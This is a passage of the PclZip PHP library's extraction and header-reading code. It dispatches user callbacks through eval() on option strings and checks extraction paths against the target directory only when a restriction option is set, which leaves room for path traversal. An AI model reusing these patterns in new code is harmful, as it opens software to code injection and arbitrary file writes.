            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
        }

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "All path is removed");
        // ----- Get the basename of the path
        $p_entry['filename'] = basename($p_entry['filename']);
    }

    // ----- Look for path to remove
    else if ($p_remove_path != "")
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Look for some path to remove");
      if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The folder is the same as the removed path '".$p_entry['filename']."'");

        // ----- Change the file status
        $p_entry['status'] = "filtered";

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }

      $p_remove_path_size = strlen($p_remove_path);
      if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Found path '$p_remove_path' to remove in file '".$p_entry['filename']."'");

        // ----- Remove the path
        $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Resulting file is '".$p_entry['filename']."'");
      }
    }

    // ----- Add the path
    if ($p_path != '') {
      $p_entry['filename'] = $p_path."/".$p_entry['filename'];
    }
    
    // ----- Check a base_dir_restriction
    if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Check the extract directory restriction");
      $v_inclusion
      = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                                $p_entry['filename']); 
      if ($v_inclusion == 0) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_EXTRACT_DIR_RESTRICTION is selected, file is outside restriction");

        PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
                                             "Filename '".$p_entry['filename']."' is "
                                                                 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
    }

    // ----- Look for pre-extract callback
    if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A pre-callback '".$p_options[PCLZIP_CB_PRE_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_PRE_EXTRACT].'(PCLZIP_CB_PRE_EXTRACT, $v_local_header);');
      if ($v_result == 0) {
        // ----- Change the file status
        $p_entry['status'] = "skipped";
        $v_result = 1;
      }
      
      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        // ----- This status is internal and will be changed in 'skipped'
        $p_entry['status'] = "aborted";
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }

      // ----- Update the informations
      // Only some fields can be modified
      $p_entry['filename'] = $v_local_header['filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "New filename is '".$p_entry['filename']."'");
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file (with path) '".$p_entry['filename']."', size '$v_header[size]'");

    // ----- Look if extraction should be done
    if ($p_entry['status'] == 'ok') {

    // ----- Look for specific actions while the file exist
    if (file_exists($p_entry['filename']))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$p_entry['filename']."' already exists");

      // ----- Look if file is a directory
      if (is_dir($p_entry['filename']))
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is a directory");

        // ----- Change the file status
        $p_entry['status'] = "already_a_directory";
        
        // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
        // For historical reason first PclZip implementation does not stop
        // when this kind of error occurs.
        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

            PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
                                             "Filename '".$p_entry['filename']."' is "
                                                                 ."already used by an existing directory");

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
                }
      }
      // ----- Look if file is write protected
      else if (!is_writeable($p_entry['filename']))
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is write protected");

        // ----- Change the file status
        $p_entry['status'] = "write_protected";

        // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
        // For historical reason first PclZip implementation does not stop
        // when this kind of error occurs.
        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

            PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
                                             "Filename '".$p_entry['filename']."' exists "
                                                                 ."and is write protected");

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
                }
      }

      // ----- Look if the extracted file is older
      else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is newer (".date("l dS of F Y h:i:s A", filemtime($p_entry['filename'])).") than the extracted file (".date("l dS of F Y h:i:s A", $p_entry['mtime']).")");
        // ----- Change the file status
        if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
                    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_REPLACE_NEWER is selected, file will be replaced");
                }
                else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File will not be replaced");
            $p_entry['status'] = "newer_exist";

            // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
            // For historical reason first PclZip implementation does not stop
            // when this kind of error occurs.
            if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
                //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

                PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
                                     "Newer version of '".$p_entry['filename']."' exists "
                                            ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                return PclZip::errorCode();
                    }
                }
      }
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is older than the extrated one - will be replaced by the extracted one (".date("l dS of F Y h:i:s A", filemtime($p_entry['filename'])).") than the extracted file (".date("l dS of F Y h:i:s A", $p_entry['mtime']).")");
      }
    }

    // ----- Check the directory availability and create it if necessary
    else {
      if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
        $v_dir_to_check = $p_entry['filename'];
      else if (!strstr($p_entry['filename'], "/"))
        $v_dir_to_check = "";
      else
        $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to create path for '".$p_entry['filename']."'");

        // ----- Change the file status
        $p_entry['status'] = "path_creation_fail";

        // ----- Return
        ////--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        //return $v_result;
        $v_result = 1;
      }
    }
    }

    // ----- Look if extraction should be done
    if ($p_entry['status'] == 'ok') {

      // ----- Do the extraction (if not a folder)
      if (!(($p_entry['external']&0x00000010)==0x00000010))
      {
        // ----- Look for not compressed file
        if ($p_entry['compression'] == 0) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting an un-compressed file");

                  // ----- Opening destination file
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
          {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Error while opening '".$p_entry['filename']."' in write binary mode");

            // ----- Change the file status
            $p_entry['status'] = "write_error";

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Read '".$p_entry['size']."' bytes");

          // ----- Read the file by PCLZIP_READ_BLOCK_SIZE octets blocks
          $v_size = $p_entry['compressed_size'];
          while ($v_size != 0)
          {
            $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Read $v_read_size bytes");
            $v_buffer = @fread($this->zip_fd, $v_read_size);
            /* Try to speed up the code
            $v_binary_data = pack('a'.$v_read_size, $v_buffer);
            @fwrite($v_dest_file, $v_binary_data, $v_read_size);
            */
            @fwrite($v_dest_file, $v_buffer, $v_read_size);            
            $v_size -= $v_read_size;
          }

          // ----- Closing the destination file
          fclose($v_dest_file);

          // ----- Change the file mtime
          touch($p_entry['filename'], $p_entry['mtime']);
          

        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting a compressed file (Compression method ".$p_entry['compression'].")");
          // ----- TBC
          // Need to be finished
          if (($p_entry['flag'] & 1) == 1) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File is encrypted");
            /*
              // ----- Read the encryption header
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read 12 encryption header bytes");
              $v_encryption_header = @fread($this->zip_fd, 12);
              
              // ----- Read the encrypted & compressed file in a buffer
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read '".($p_entry['compressed_size']-12)."' compressed & encrypted bytes");
              $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']-12);
              
              // ----- Decrypt the buffer
              $this->privDecrypt($v_encryption_header, $v_buffer,
                                             $p_entry['compressed_size']-12, $p_entry['crc']);
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Buffer is '".$v_buffer."'");
              */
          }
          else {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read '".$p_entry['compressed_size']."' compressed bytes");
              // ----- Read the compressed file in a buffer (one shot)
              $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          }
          
          // ----- Decompress the file
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to inflate compressed file");

            // ----- Change the file status
            // TBC
            $p_entry['status'] = "error";
            
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }
          
          // ----- Opening destination file
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Error while opening '".$p_entry['filename']."' in write binary mode");

            // ----- Change the file status
            $p_entry['status'] = "write_error";

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Write the uncompressed data
          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          // ----- Closing the destination file
          @fclose($v_dest_file);

          // ----- Change the file mtime
          @touch($p_entry['filename'], $p_entry['mtime']);
        }

        // ----- Look for chmod option
        if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "chmod option activated '".$p_options[PCLZIP_OPT_SET_CHMOD]."'");

          // ----- Change the mode of the file
          @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
        }

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extraction done");
      }
    }

        // ----- Change abort status
        if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
        }
        
    // ----- Look for post-extract callback
    elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A post-callback '".$p_options[PCLZIP_CB_POST_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_POST_EXTRACT].'(PCLZIP_CB_POST_EXTRACT, $v_local_header);');

      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractFileInOutput()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privExtractFileInOutput(&$p_entry, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privExtractFileInOutput', "");
    $v_result=1;

    // ----- Read the file header
    if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found file '".$v_header['filename']."', size '".$v_header['size']."'");

    // ----- Check that the file header is coherent with $p_entry info
    if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
        // TBC
    }

    // ----- Look for pre-extract callback
    if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A pre-callback '".$p_options[PCLZIP_CB_PRE_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_PRE_EXTRACT].'(PCLZIP_CB_PRE_EXTRACT, $v_local_header);');
      if ($v_result == 0) {
        // ----- Change the file status
        $p_entry['status'] = "skipped";
        $v_result = 1;
      }

      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        // ----- This status is internal and will be changed in 'skipped'
        $p_entry['status'] = "aborted";
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }

      // ----- Update the informations
      // Only some fields can be modified
      $p_entry['filename'] = $v_local_header['filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "New filename is '".$p_entry['filename']."'");
    }

    // ----- Trace
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file (with path) '".$p_entry['filename']."', size '$v_header[size]'");

    // ----- Look if extraction should be done
    if ($p_entry['status'] == 'ok') {

      // ----- Do the extraction (if not a folder)
      if (!(($p_entry['external']&0x00000010)==0x00000010)) {
        // ----- Look for not compressed file
        if ($p_entry['compressed_size'] == $p_entry['size']) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting an un-compressed file");
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Reading '".$p_entry['size']."' bytes");

          // ----- Read the file in a buffer (one shot)
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

          // ----- Send the file to the output
          echo $v_buffer;
          unset($v_buffer);
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting a compressed file");
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Reading '".$p_entry['size']."' bytes");

          // ----- Read the compressed file in a buffer (one shot)
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          // ----- Decompress the file
          $v_file_content = gzinflate($v_buffer);
          unset($v_buffer);

          // ----- Send the file to the output
          echo $v_file_content;
          unset($v_file_content);
        }
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extraction done");
      }
    }

        // ----- Change abort status
        if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
        }

    // ----- Look for post-extract callback
    elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A post-callback '".$p_options[PCLZIP_CB_POST_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_POST_EXTRACT].'(PCLZIP_CB_POST_EXTRACT, $v_local_header);');

      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }
    }

    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractFileAsString()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privExtractFileAsString(&$p_entry, &$p_string)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privExtractFileAsString', "p_entry['filename']='".$p_entry['filename']."'");
    $v_result=1;

    // ----- Read the file header
    $v_header = array();
    if (($v_result = $this->privReadFileHeader($v_header)) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found file '".$v_header['filename']."', size '".$v_header['size']."'");

    // ----- Check that the file header is coherent with $p_entry info
    if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
        // TBC
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file in string (with path) '".$p_entry['filename']."', size '$v_header[size]'");

    // ----- Do the extraction (if not a folder)
    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      // ----- Look for not compressed file
//      if ($p_entry['compressed_size'] == $p_entry['size'])
      if ($p_entry['compression'] == 0) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting an un-compressed file");
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Reading '".$p_entry['size']."' bytes");

        // ----- Reading the file
        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting a compressed file (compression method '".$p_entry['compression']."')");

        // ----- Reading the file
        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        // ----- Decompress the file
        if (($p_string = @gzinflate($v_data)) === FALSE) {
            // TBC
        }
      }

      // ----- Trace
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extraction done");
    }
    else {
        // TBC : error : can not extract a folder in a string
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privReadFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privReadFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privReadFileHeader", "");
    $v_result=1;

    // ----- Read the 4 bytes signature
    $v_binary_data = @fread($this->zip_fd, 4);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary data is : '".sprintf("%08x", $v_binary_data)."'");
    $v_data = unpack('Vid', $v_binary_data);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary signature is : '".sprintf("0x%08x", $v_data['id'])."'");

    // ----- Check signature
    if ($v_data['id'] != 0x04034b50)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Invalid File header");

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Read the first 42 bytes of the header
    $v_binary_data = fread($this->zip_fd, 26);

    // ----- Look for invalid block size
    if (strlen($v_binary_data) != 26)
    {
      $p_header['filename'] = "";
      $p_header['status'] = "invalid_header";
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Invalid block size : ".strlen($v_binary_data));

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Extract the values
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Header : '".$v_binary_data."'");
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Header (Hex) : '".bin2hex($v_binary_data)."'");
    $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

    // ----- Get filename
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "File name length : ".$v_data['filename_len']);
    $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Filename : \''.$p_header['filename'].'\'');

    // ----- Get extra_fields
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extra field length : ".$v_data['extra_len']);
    if ($v_data['extra_len'] != 0) {
      $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
    }
    else {
      $p_header['extra'] = '';
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Extra field : \''.bin2hex($p_header['extra']).'\'');

    // ----- Extract properties
    $p_header['version_extracted'] = $v_data['version'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, 'Version need to extract : ('.$p_header['version_extracted'].') \''.($p_header['version_extracted']/10).'.'.($p_header['version_extracted']%10).'\'');
    $p_header['compression'] = $v_data['compression'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Compression method : \''.$p_header['compression'].'\'');
    $p_header['size'] = $v_data['size'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Size : \''.$p_header['size'].'\'');
    $p_header['compressed_size'] = $v_data['compressed_size'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Compressed Size : \''.$p_header['compressed_size'].'\'');
    $p_header['crc'] = $v_data['crc'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'CRC : \''.sprintf("0x%X", $p_header['crc']).'\'');
    $p_header['flag'] = $v_data['flag'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Flag : \''.$p_header['flag'].'\'');
    $p_header['filename_len'] = $v_data['filename_len'];
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Filename_len : \''.$p_header['filename_len'].'\'');

    // ----- Recuperate date in UNIX format
    $p_header['mdate'] = $v_data['mdate'];
    $p_header['mtime'] = $v_data['mtime'];
    if ($p_header['mdate'] && $p_header['mtime'])
    {
      // ----- Extract time
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;

      // ----- Extract date
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
      $v_day = $p_header['mdate'] & 0x001F;

      // ----- Get UNIX date format
      $p_header['mtime'] = time();//mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }
    else
    {
      $p_header['mtime'] = time();
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Date is actual : \''.date("d/m/y H:i:s", $p_header['mtime']).'\'');
    }

    // TBC
    //for(reset($v_data); $key = key($v_data); next($v_data)) {
    //  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Attribut[$key] = ".$v_data[$key]);
    //}

    // ----- Set the stored filename
    $p_header['stored_filename'] = $p_header['filename'];

    // ----- Set the status field
    $p_header['status'] = "ok";

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privReadCentralFileHeader()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privReadCentralFileHeader(&$p_header)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privReadCentralFileHeader", "");
    $v_result=1;

    // ----- Read the 4 bytes signature
    $v_binary_data = @fread($this->zip_fd, 4);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary data is : '".sprintf("%08x", $v_binary_data)."'");
    $v_data = unpack('Vid', $v_binary_data);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Binary signature is : '".sprintf("0x%08x", $v_data['id'])."'");

    // ----- Check signature
    if ($v_data['id'] != 0x02014b50)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Invalid Central Dir File signature");

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Read the first 42 bytes of the header
    $v_binary_data = fread($this->zip_fd, 42);

    // ----- Look for invalid block size
    if (strlen($v_binary_data) != 42)
    {
      $p_header['filename'] = "";
      $p_header['status'] = "invalid_header";
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Invalid block size : ".strlen($v_binary_data));

      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Extract the values
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Header : '".$v_binary_data."'");
